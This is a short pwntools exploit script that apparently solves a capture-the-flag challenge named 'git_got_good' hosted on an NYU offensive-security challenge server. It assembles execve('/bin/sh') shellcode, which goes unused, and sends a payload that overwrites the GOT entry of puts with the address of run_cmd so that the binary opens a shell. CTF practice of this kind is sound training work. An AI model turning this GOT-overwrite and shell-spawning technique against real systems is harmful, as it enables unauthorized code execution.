from pwn import *

local = False

context.arch = "amd64"
context.os = "linux"
context.bits = 64
context.log_level="DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

assembly =asm('''
mov rax, 0x3b
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
''')

if local:
    p = gdb.debug("./git_got_good", '''
                              break main
                              continue
                              ''')
else:
    p=remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1341)

print(p.recvuntil(b"save: "))

puts_addr = 0x00601010
e = ELF("./git_got_good")
jump_addr = e.symbols["run_cmd"]
p.send(b"/bin/sh" + b"\0" + jump_addr.to_bytes(8, "little") + puts_addr.to_bytes(8, "little") + b"\n")

print(p.recvuntil(b"buffer...\n"))

p.interactive()
